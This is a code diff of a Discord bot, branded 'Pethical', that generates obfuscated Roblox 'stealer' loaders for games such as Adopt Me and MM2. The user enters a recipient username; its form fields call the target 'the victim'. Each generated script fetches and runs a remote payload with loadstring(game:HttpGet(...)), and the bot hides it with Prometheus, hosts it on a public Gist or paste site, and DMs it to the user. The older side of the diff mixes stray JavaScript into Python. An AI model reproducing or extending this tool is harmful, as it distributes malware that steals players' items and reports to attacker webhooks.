@@ -1,193 +1,220 @@
-import discord
-from discord.ext import commands
-from discord import app_commands
-import subprocess
-import secrets
 import os
 import requests
-from typing import Optional
+import discord
+from discord import app_commands
+from discord.ext import commands
+from datetime import datetime
 
-console.log('Environment variables loaded:');
-console.log('BOT_TOKEN:', process.env.BOT_TOKEN ? 'Found' : 'Missing');
-console.log('PASTEFY_TOKEN:', process.env.PASTEFY_TOKEN ? 'Found' : 'Missing');
-
-const token = process.env.BOT_TOKEN;
-const pastefy = process.env.PASTEFY_TOKEN;
-
+# Initialize intents
 intents = discord.Intents.default()
+intents.members = True
+intents.guilds = True
 intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
-tree = bot.tree
 
-def upload_to_pastefy(title: str, content: str) -> str:
-    url = "https://pastefy.app/api/v2/paste"
+# Create bot instance
+bot = commands.Bot(command_prefix='/', intents=intents)
+
+# Replace these with your tokens
+BOT_TOKEN = os.getenv('BOT_TOKEN')
+GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
+ERROR_LOG_WEBHOOK = os.getenv('ERROR_LOG_WEBHOOK')  # Error logging webhook
+USER_ACTIVITY_WEBHOOK = os.getenv('USER_ACTIVITY_WEBHOOK')  # User activity webhook
+
+# Helper function to create a GitHub Gist and return the clean Gist raw URL
+def create_github_gist(file_content, filename, description="Generated Script"):
+    url = "https://api.github.com/gists"
     headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "X-API-KEY": PASTEFY_TOKEN,
+        "Authorization": f"token {GITHUB_TOKEN}",
+        "Accept": "application/vnd.github.v3+json"
     }
-
     data = {
-        "type": "PASTE",
-        "title": title,
-        "content": content,
-        "visibility": "UNLISTED",
-        "encrypted": False,
+        "description": description,
+        "public": True,
+        "files": {
+            filename: {
+                "content": file_content
+            }
+        }
     }
+    response = requests.post(url, json=data, headers=headers)
+    
+    if response.status_code == 201:
+        gist_url = response.json()["html_url"]
+        gist_id = gist_url.split('/')[-1]
+        raw_url = f"https://gist.githubusercontent.com/raw/{gist_id}"
+        return raw_url
+    else:
+        raise Exception(f"Error creating GitHub Gist: {response.status_code}, {response.text}")
 
-    response = requests.post(url, headers=headers, json=data)
-    response.raise_for_status()
-    resp_json = response.json()
-    paste_url = resp_json.get("paste", {}).get("raw_url")
-    if not paste_url:
-        raise Exception("Error Try again!")
-    return paste_url
+def send_error_log(error_message):
+    """Send error logs to a Discord webhook."""
+    data = {
+        "content": f"**Error Log:**\n```{error_message}```",
+        "username": "Bot Error Logger"
+    }
+    requests.post(ERROR_LOG_WEBHOOK, json=data)
 
-class CopyButton(discord.ui.View):
-    def __init__(self):
+def log_user_activity(username, stealer_type):
+    """Log user activity with their Discord username and the type of stealer they generated."""
+    data = {
+        "content": f"**User Activity Log:**\n- **Username:** {username}\n- **Generated Stealer:** {stealer_type}",
+        "username": "User Activity Logger"
+    }
+    requests.post(USER_ACTIVITY_WEBHOOK, json=data)
+
+class CopyButton(discord.ui.Button):
+    def __init__(self, loadstring_code):
+        super().__init__(label="Copy", style=discord.ButtonStyle.primary)
+        self.loadstring_code = loadstring_code
+
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.send_message(self.loadstring_code, ephemeral=True)
+
+class CopyButtonView(discord.ui.View):
+    def __init__(self, loadstring_code):
         super().__init__(timeout=None)
+        self.add_item(CopyButton(loadstring_code))
 
-    @discord.ui.button(label="Copy ✉️", style=discord.ButtonStyle.primary, custom_id="copy_code_button")
-    async def callback(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            embed = interaction.message.embeds[0]
-            raw_value = embed.fields[0].value
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user}")
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} commands globally.")
+    except Exception as e:
+        send_error_log(f"Error syncing commands: {e}")
 
-            if raw_value.startswith("```lua"):
-                code = raw_value[6:]
-            elif raw_value.startswith("```"):
-                code = raw_value[3:]
-            else:
-                code = raw_value
+@bot.tree.command(name="generate", description="Choose Your Stealer.")
+async def generate(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="**CHOOSE YOUR STEALER**",
+        description="🔪 **Mm2** = ✅\n🐱 **Ps99** = ✅\n🔪 **Pls Donate** = ✅\n🧸 **Adopt Me**",
+        color=discord.Color.red()
+    )
+    
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    embed.set_footer(text=f"⚡ Pethical ⚡ | {current_time}")
 
-            if code.endswith("```"):
-                code = code[:-3]
+    select = discord.ui.Select(
+        placeholder="Click To Choose Your Stealer!",
+        options=[
+            discord.SelectOption(label="Mm2", value="mm2"),
+            discord.SelectOption(label="Ps99", value="ps99"),
+            discord.SelectOption(label="Pls Donate", value="plsdonate"),
+            discord.SelectOption(label="Adopt Me", value="adoptme"),
+        ]
+    )
 
-            code = code.strip()
-            await interaction.response.send_message(content=code, ephemeral=True)
-        except Exception:
-            await interaction.response.send_message("Error Try again!", ephemeral=True)
+    async def select_callback(interaction: discord.Interaction):
+        stealer_options = {
+            "mm2": show_mm2_form,
+            "ps99": show_ps99_form,
+            "plsdonate": show_plsdonate_form,
+            "adoptme": show_adoptme_form
+        }
+        await stealer_options[select.values[0]](interaction)
 
-@tree.command(name="gen_adoptme", description="Set up Adopt Me Script")
-async def show_adoptme_form(interaction: discord.Interaction):
-    class AdoptMeModal(discord.ui.Modal, title="Adopt Me Script Setup"):
-        username = discord.ui.TextInput(label="Username", placeholder="Main Target Username")
-        webhook = discord.ui.TextInput(label="Webhook", placeholder="Your Webhook URL", required=False)
+    select.callback = select_callback
+
+    view = discord.ui.View()
+    view.add_item(select)
+    
+    await interaction.response.send_message(embed=embed, view=view)
+
+async def show_ps99_form(interaction):
+    class Ps99Modal(discord.ui.Modal, title="Ps99 Setup"):
+        username = discord.ui.TextInput(label="Username", placeholder="Username Of The Account You Want Mail To Be Sent To")
+        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")
+       
+        async def on_submit(self, interaction: discord.Interaction):
+            username, webhook = self.username.value, self.webhook.value
+            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/PS99/refs/heads/main/Protected_PS99.lua"))()"""
+            log_user_activity(interaction.user.name, "PS99")
+            await generate_and_send_script(interaction, script, "PS99")
+
+    await interaction.response.send_modal(Ps99Modal())
+
+async def show_plsdonate_form(interaction):
+    class PlsDonateModal(discord.ui.Modal, title="Pls Donate Setup"):
+        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
+        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")
 
         async def on_submit(self, interaction: discord.Interaction):
-            await interaction.response.defer(ephemeral=True)
-            try:
-                lua_code = f'''
-Username = "{self.username.value}"
-Webhook = "{self.webhook.value}"
+            username, webhook = self.username.value, self.webhook.value
+            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/Pls-Donate/refs/heads/main/Protected_PlsDonate.lua'))()"""
+            log_user_activity(interaction.user.name, "Pls Donate")
+            await generate_and_send_script(interaction, script, "Pls Donate")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua"))()
-'''
+    await interaction.response.send_modal(PlsDonateModal())
 
-                filename = f"{secrets.token_hex(8)}.lua"
-                with open(filename, "w", encoding="utf-8") as f:
-                    f.write(lua_code)
-
-                subprocess.run(["lua", "./Prometheus/cli.lua", "--preset", "Medium", filename], check=True)
-                obf_file = filename.replace(".lua", ".obfuscated.lua")
-                if not os.path.exists(obf_file):
-                    raise Exception("Obfuscation failed.")
-
-                with open(obf_file, "r", encoding="utf-8") as f:
-                    obf_content = f.read()
-
-                paste_url = upload_to_pastefy("discord.gg/F3bb3e8VBe", obf_content)
-                final_script = f'```lua\nloadstring(game:HttpGet("{paste_url}", true))()\n```'
-
-                embed = discord.Embed(
-                    title="Adopt Me Script Generated",
-                    description="This script is generated exclusively for you",
-                    color=discord.Color.gold()
-                )
-                embed.set_thumbnail(
-                    url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682f91eb&is=682e406b&hm=c145392b83a74694b25dcb11d4addf082d08cd10af4571a61174ba2450c816c9&"
-                )
-                embed.add_field(name="Script", value=final_script, inline=False)
-                embed.set_footer(text="Made By Pethical 🎉")
-
-                view = CopyButton()
-                try:
-                    await interaction.user.send(embed=embed, view=view)
-                    await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
-                except:
-                    await interaction.followup.send("Failed to send DM. Check your DM settings.", ephemeral=True)
-            except Exception:
-                await interaction.followup.send("Error Try again!", ephemeral=True)
-            finally:
-                for file in [filename, obf_file]:
-                    if os.path.exists(file):
-                        os.remove(file)
-
-    await interaction.response.send_modal(AdoptMeModal())
-
-# GEN MM2 MODAL
-@tree.command(name="gen_mm2", description="Set up MM2 Script")
-async def show_mm2_form(interaction: discord.Interaction):
-    class Mm2Modal(discord.ui.Modal, title="MM2 Script Setup"):
-        username = discord.ui.TextInput(label="Username", placeholder="Target Username")
-        webhook = discord.ui.TextInput(label="Webhook", placeholder="Your Webhook URL", required=False)
+async def show_mm2_form(interaction):
+    class Mm2Modal(discord.ui.Modal, title="MM2 Setup"):
+        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
+        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")
 
         async def on_submit(self, interaction: discord.Interaction):
-            await interaction.response.defer(ephemeral=True)
-            try:
-                lua_code = f'''
-Username = "{self.username.value}"
-Webhook = "{self.webhook.value}"
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/MM2/refs/heads/main/Protected_MM2.lua"))()
-'''
-
-                filename = f"{secrets.token_hex(8)}.lua"
-                with open(filename, "w", encoding="utf-8") as f:
-                    f.write(lua_code)
-
-                subprocess.run(["lua", "./Prometheus/cli.lua", "--preset", "Medium", filename], check=True)
-                obf_file = filename.replace(".lua", ".obfuscated.lua")
-                if not os.path.exists(obf_file):
-                    raise Exception("Obfuscation failed.")
-
-                with open(obf_file, "r", encoding="utf-8") as f:
-                    obf_content = f.read()
-
-                paste_url = upload_to_pastefy("discord.gg/F3bb3e8VBe", obf_content)
-                final_script = f'```lua\nloadstring(game:HttpGet("{paste_url}", true))()\n```'
-
-                embed = discord.Embed(
-                    title="MM2 Script Generated",
-                    description="This script is generated exclusively for you",
-                    color=discord.Color.green()
-                )
-                embed.set_thumbnail(
-                    url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682f91eb&is=682e406b&hm=c145392b83a74694b25dcb11d4addf082d08cd10af4571a61174ba2450c816c9&"
-                )
-                embed.add_field(name="Script", value=final_script, inline=False)
-                embed.set_footer(text="Made By Pethical 🎉")
-
-                view = CopyButton()
-                try:
-                    await interaction.user.send(embed=embed, view=view)
-                    await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
-                except:
-                    await interaction.followup.send("Failed to send DM. Check your DM settings.", ephemeral=True)
-            except Exception:
-                await interaction.followup.send("Error Try again!", ephemeral=True)
-            finally:
-                for file in [filename, obf_file]:
-                    if os.path.exists(file):
-                        os.remove(file)
+            username, webhook = self.username.value, self.webhook.value
+            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/MM2/refs/heads/main/Protected_MM2.lua'))()"""
+            log_user_activity(interaction.user.name, "MM2")
+            await generate_and_send_script(interaction, script, "MM2")
 
     await interaction.response.send_modal(Mm2Modal())
 
-# READY
-@bot.event
-async def on_ready():
-    await tree.sync()
-    await bot.change_presence(activity=discord.Game(name=".gg/F3bb3e8VBe"))
-    print(f"✅ Bot is online as {bot.user}")
+async def show_adoptme_form(interaction):
+    class AdoptMeModal(discord.ui.Modal, title="Adopt Me Setup"):
+        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
+        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")
+
+        async def on_submit(self, interaction: discord.Interaction):
+            username, webhook = self.username.value, self.webhook.value
+            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua'))()"""
+            log_user_activity(interaction.user.name, "Adopt Me")
+            await generate_and_send_script(interaction, script, "Adopt Me")
+
+    await interaction.response.send_modal(AdoptMeModal())
+
+async def generate_and_send_script(interaction, script_content, script_name):
+    obfuscations_dir = "obfuscations"
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    os.makedirs(obfuscations_dir, exist_ok=True)
+    
+    script_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.lua")
+    obfuscated_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.obfuscated.lua")
+
+    try:
+        with open(script_file_path, "w") as f:
+            f.write(script_content)
+
+        os.system(f"lua bot/Prometheus/cli.lua {script_file_path} --LuaU --preset Medium")
+
+        with open(obfuscated_file_path, "r") as obfed_script_file:
+            obf_script = obfed_script_file.read()
+
+        raw_url = create_github_gist(obf_script, f"{interaction.user.id}_{script_name.lower()}.lua")
+        loadstring_code_for_embed = f"```lua\nloadstring(game:HttpGet('{raw_url}'))()\n```"
+        loadstring_code_for_copy = f"loadstring(game:HttpGet('{raw_url}'))()"
+
+        await interaction.response.send_message(f"Check Your DMs, {interaction.user.mention}!", ephemeral=True)
+        user_dm = await interaction.user.create_dm()
+
+        embed = discord.Embed(
+            title=f"**{script_name} Generated!**",
+            description="Your script has been obfuscated for you.",
+            color=discord.Color.blue()
+        )
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1299029863427997777/1375088904926920774/ezgif-773b12b7adb575.gif?ex=68306ad6&is=682f1956&hm=f1595a76726a16f9918645081365457571b473daa59c9b33f332609df3f2e747&")
+        embed.add_field(name="Loadstring Code", value=loadstring_code_for_embed)
+        embed.set_footer(text=f"⚡ Pethical ⚡ | {current_time}")
+
+        view = CopyButtonView(loadstring_code_for_copy)
+        await user_dm.send(embed=embed, view=view)
+
+    except Exception as e:
+        send_error_log(f"An error occurred: {e}")
+
+    finally:
+        for file_path in [script_file_path, obfuscated_file_path]:
+            if os.path.exists(file_path):
+                os.remove(file_path)
 
 bot.run(BOT_TOKEN)
